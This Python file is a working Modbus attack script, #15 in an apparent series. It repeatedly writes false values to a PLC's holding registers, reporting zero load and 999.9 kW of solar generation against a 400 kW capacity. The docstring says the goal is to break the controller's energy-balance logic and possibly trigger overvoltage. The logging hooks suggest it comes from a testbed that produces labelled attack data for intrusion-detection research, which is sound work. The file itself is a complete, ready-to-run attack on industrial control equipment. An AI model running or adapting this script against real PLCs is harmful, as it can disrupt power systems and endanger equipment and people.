"""
Attack #15: Impossible_State_Injection (Physically Impossible State Injection)
===============================================================================
Target registers: HR12 (Total kW) + HR14 (Solar kW x10)
Technique: Reports zero consumption while reporting solar generation far above
           the installed capacity, forcing the PLC's energy-balance
           calculation into a physically inconsistent state.
Effect: The control algorithm produces nonsensical balance results; grid
        frequency rises and an overvoltage condition may be triggered.
MITRE ATT&CK for ICS: T0821 - Modify Controller Tasking
"""

import time
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from pymodbus.client import ModbusTcpClient
from attacks.config import (
    PLC_IP, PLC_PORT, UNIT_ID,
    HR12_TOTAL_KW, HR14_SOLAR_KW,
    ATTACK_LOOP_DELAY,
    LABEL_LOGIC_FLAW
)

# ---------------------------------------------------------------------------
# Attack parameters
# ---------------------------------------------------------------------------
ZERO_LOAD = 0         # Reported consumption = 0 kW
MAX_SOLAR = 9999      # Reported solar = 999.9 kW (x10 scale)
                      # Panel capacity is 400 kW, so 999.9 kW is physically impossible

ATTACK_NAME = "Impossible_State_Injection"
ATTACK_ID   = LABEL_LOGIC_FLAW


def run_attack(duration_sec=600, label_manager=None):
    """
    Injects a physically impossible combination of load and solar generation
    (HR12=0, HR14=9999) to disrupt the PLC's energy-balance logic.
    """
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)

    if not client.connect():
        print(f"[-] PLC connection failed: {PLC_IP}:{PLC_PORT}")
        return False

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target: HR{HR12_TOTAL_KW} (Load) + HR{HR14_SOLAR_KW} (Solar)")
    print(f"  HR12 -> {ZERO_LOAD} kW | HR14 -> {MAX_SOLAR} (= {MAX_SOLAR/10:.1f} kW)")
    print(f"  Duration: {duration_sec}s ({duration_sec//60} min)")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(
            ATTACK_ID, ATTACK_NAME,
            f"HR12={ZERO_LOAD}, HR14={MAX_SOLAR} ({MAX_SOLAR/10:.1f}kW)"
        )

    start_time = time.time()
    packet_count = 0

    try:
        while (time.time() - start_time) < duration_sec:
            try:
                client.write_register(address=HR12_TOTAL_KW, value=ZERO_LOAD)
                client.write_register(address=HR14_SOLAR_KW, value=MAX_SOLAR)
                packet_count += 2
            except Exception as e:
                if packet_count % 50 == 0:
                    print(f"  [IMPOSSIBLE] Reconnecting... ({e})")
                try:
                    client.close()
                    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
                    client.connect()
                except Exception:
                    pass
                time.sleep(0.5)
                continue

            if packet_count % 200 == 0:
                elapsed = time.time() - start_time
                remaining = duration_sec - elapsed
                print(f"  [IMPOSSIBLE] packet #{packet_count} | "
                      f"Load=0, Solar={MAX_SOLAR/10:.0f}kW | "
                      f"remaining: {remaining:.0f}s")

            time.sleep(ATTACK_LOOP_DELAY)

    except KeyboardInterrupt:
        print("\n  [IMPOSSIBLE] Manual stop!")

    finally:
        elapsed = time.time() - start_time
        client.close()
        if label_manager:
            label_manager.log_attack_end(
                ATTACK_ID, ATTACK_NAME,
                f"{packet_count} packets, {elapsed:.1f}s"
            )
        print(f"\n  [IMPOSSIBLE] Attack finished: {packet_count} packets, {elapsed:.1f}s")
        return True


if __name__ == "__main__":
    run_attack(duration_sec=60)
